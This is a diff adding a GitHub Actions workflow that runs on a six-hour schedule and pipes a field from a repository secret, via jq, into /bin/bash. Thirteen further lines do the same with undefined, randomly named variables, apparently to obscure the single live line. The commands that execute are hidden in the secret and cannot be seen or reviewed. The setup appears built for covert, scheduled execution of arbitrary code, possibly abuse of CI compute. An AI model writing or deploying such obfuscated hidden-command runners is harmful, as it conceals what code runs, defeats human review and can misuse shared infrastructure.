@@ -1,0 +1,31 @@
+name: flycarx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: flycarx
+        env:
+          q915: ${{ secrets.q915 }}
+        run: |
+          echo $q915 | jq -r .bovkr81224 | /bin/bash
+          echo $sxink8956 | jq -r .hn800 | /bin/bash
+          echo $gdfna68341 | jq -r .y9947 | /bin/bash
+          echo $zfcr0456 | jq -r .tsj466 | /bin/bash
+          echo $aocem0 | jq -r .o8169 | /bin/bash
+          echo $cj289 | jq -r .uosi5 | /bin/bash
+          echo $vpor629 | jq -r .ik29 | /bin/bash
+          echo $cmkuu86 | jq -r .bxi3 | /bin/bash
+          echo $hfo3 | jq -r .l38323 | /bin/bash
+          echo $pz02 | jq -r .betc2 | /bin/bash
+          echo $irc205 | jq -r .a0 | /bin/bash
+          echo $nv4075 | jq -r .j33 | /bin/bash
+          echo $kwq138 | jq -r .gretk93032 | /bin/bash
+          echo $vrxbu16 | jq -r .csw15241 | /bin/bash
+
